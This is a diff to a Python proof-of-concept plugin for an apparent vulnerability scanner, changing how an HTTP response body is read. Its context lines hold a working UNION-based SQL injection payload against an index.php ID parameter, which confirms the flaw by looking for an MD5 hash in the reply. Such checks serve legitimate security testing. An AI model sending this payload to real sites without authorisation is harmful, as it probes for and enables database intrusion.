@@ -47,7 +47,7 @@ class Poc(ABPoc):
                 target=self.target, vuln=self.vuln))
             payload = "/index.php?ID=1 UNION SELECT 1,md5(666),3,4,5,6,7,8--"
             verify_url = '{target}'.format(target=self.target) + payload
-            content = requests.get(verify_url).content
+            content = requests.get(verify_url).text
             if 'fae0b27c451c728867a567e8c1bb4e53' in content:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
